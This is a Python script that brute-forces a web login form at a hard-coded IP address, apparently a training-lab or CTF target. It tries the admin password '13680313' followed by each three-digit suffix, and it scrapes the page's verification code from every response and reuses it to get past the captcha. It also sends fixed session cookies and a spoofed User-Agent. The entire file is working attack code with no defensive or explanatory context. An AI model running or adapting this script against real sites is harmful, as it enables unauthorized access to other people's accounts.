from urllib import request, parse
from lxml import etree
from bs4 import BeautifulSoup

logger_level = "INFO"
def log(*string, level="INFO"):
    logger_type = {"DEBUG":0, "WARNING":1, "INFO":2, "ERROR":3}

    if logger_type[logger_level]<=logger_type[level]:
        res = ""
        for s in string:
            if type(s) is bytes:
                res += s.decode("utf8")
            else:
                res += str(s)
        print(res)

def login_brute(guess, vcode):
    login_data = parse.urlencode([
        ('username', "admin"),
        ('password', "13680313"+guess),
        ('vcode', vcode)
    ])

    req = request.Request('http://49.235.141.207:25504/1zonghe/baopo/yanzhengma/')
    req.add_header('Referer', 'http://49.235.141.207:25504/1zonghe/baopo/yanzhengma/')
    req.add_header('User-Agent', 'Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25')
    req.add_header("Cookie",'PHPSESSID=2gaheb0dpfo173ko4923a4vga1; session=82bd1cf0-12e9-485f-855b-ce98f649440a')
    log("==="*20, level="DEBUG")
    log("Request:", req.get_full_url(), level="DEBUG")
    log("Method:", req.get_method(), level="DEBUG")

    with request.urlopen(req, data=login_data.encode('utf-8')) as f:
        log("REQ DATA:",req.data)
        log('Status:', f.status, f.reason, level="DEBUG")
        for k, v in f.getheaders():
            log('%s: %s' % (k, v), level="DEBUG")
        html_doc = f.read().decode('utf-8')
        log("==="*20, level="DEBUG")
        log('RES Data:', html_doc, level="DEBUG")


    selector = etree.HTML(html_doc)
    if html_doc.find("error") == -1:
        log("SUCCESS!!!! PASSWORD:", "13680313"+guess)

    vcode_xpath = selector.xpath("/html/body/form/text()[3]")
    vcode_filter = filter(str.isdigit, str(vcode_xpath))
    vcode = "".join([ch for ch in vcode_filter])
    log("vcode:", vcode, level="DEBUG")

    return vcode


vcode = 0
for num in range(0, 1000):
    guess = "%03d" %num
    vcode = login_brute(guess, vcode)
